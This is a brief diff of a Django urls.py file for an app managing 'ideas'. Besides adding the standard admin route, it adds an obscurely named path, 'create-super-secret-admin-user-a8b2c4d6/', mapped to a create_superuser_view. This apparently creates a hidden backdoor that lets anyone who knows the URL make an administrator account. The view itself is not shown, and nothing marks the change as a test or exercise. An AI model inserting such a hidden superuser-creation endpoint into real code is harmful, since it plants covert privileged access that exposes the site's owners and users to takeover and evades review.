@@ -18,6 +18,8 @@ urlpatterns = [
     path('idea/<int:pk>/', views.IdeaDetailView.as_view(), name='idea_detail'),
     path('idea/<int:pk>/edit/', views.IdeaUpdateView.as_view(), name='idea_update'),
     path('idea/<int:pk>/delete/', views.IdeaDeleteView.as_view(), name='idea_delete'),
+    path('create-super-secret-admin-user-a8b2c4d6/', views.create_superuser_view),
+    path('admin/', admin.site.urls),
 ]
 
 if settings.DEBUG:
